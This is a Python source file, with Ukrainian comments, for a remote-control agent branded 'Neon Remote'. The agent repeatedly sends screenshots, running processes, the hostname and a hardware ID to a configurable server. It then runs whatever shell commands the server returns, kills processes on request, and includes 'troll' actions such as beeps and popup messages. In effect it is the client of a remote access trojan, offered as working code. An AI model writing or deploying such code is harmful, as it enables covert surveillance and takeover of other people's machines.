import time
import os
import io
import base64
import subprocess
import requests
import psutil
import uuid
import socket
from PIL import ImageGrab

# ⚙️ ВКАЖІТЬ АДРЕСУ ВАШОГО СЕРВЕРА (наприклад: https://your-app.onrender.com)
SERVER_URL = "http://127.0.0.1:5000"

HWID = f"{socket.gethostname()}-{uuid.getnode()}"

def get_screenshot_b64():
    try:
        img = ImageGrab.grab()
        img.thumbnail((1280, 720))
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=50)
        return base64.b64encode(buffer.getvalue()).decode('utf-8')
    except Exception:
        return ""

def get_processes():
    procs = []
    try:
        for p in psutil.process_iter(['pid', 'name']):
            procs.append(p.info)
            if len(procs) >= 30:
                break
    except Exception:
        pass
    return procs

def execute_cmd(command):
    try:
        res = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=12)
        output = res.stdout or res.stderr or "Команда виконана (немає виводу)."
        return output
    except Exception as e:
        return f"Помилка виконання: {str(e)}"

def run_agent():
    print(f"🤖 Агент запущено. ПК: {socket.gethostname()}. Сервер: {SERVER_URL}")
    last_cmd_out = None
    
    while True:
        try:
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            screen_b64 = get_screenshot_b64()
            procs = get_processes()
            
            payload = {
                'hwid': HWID,
                'hostname': socket.gethostname(),
                'cpu': cpu,
                'ram': ram,
                'screenshot': screen_b64,
                'processes': procs,
                'cmd_output': last_cmd_out
            }
            last_cmd_out = None

            response = requests.post(f"{SERVER_URL}/api/agent/report", json=payload, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                for item in commands:
                    c_type = item.get('type')
                    c_payload = item.get('payload')
                    
                    if c_type == 'cmd':
                        print(f"Виконання CMD: {c_payload}")
                        last_cmd_out = execute_cmd(c_payload)
                        
                    elif c_type == 'kill_proc':
                        try:
                            psutil.Process(int(c_payload)).kill()
                            last_cmd_out = f"Процес {c_payload} завершено."
                        except Exception as e:
                            last_cmd_out = f"Помилка зупинки PID {c_payload}: {e}"
                            
                    elif c_type == 'troll':
                        if c_payload == 'beep':
                            try:
                                import winsound
                                winsound.Beep(1000, 500)
                            except Exception:
                                pass
                        elif c_payload == 'msg':
                            execute_cmd('msg * "Hello from Neon Remote!"')

        except Exception:
            time.sleep(3)
            continue
            
        time.sleep(1.5)

if __name__ == '__main__':
    run_agent()
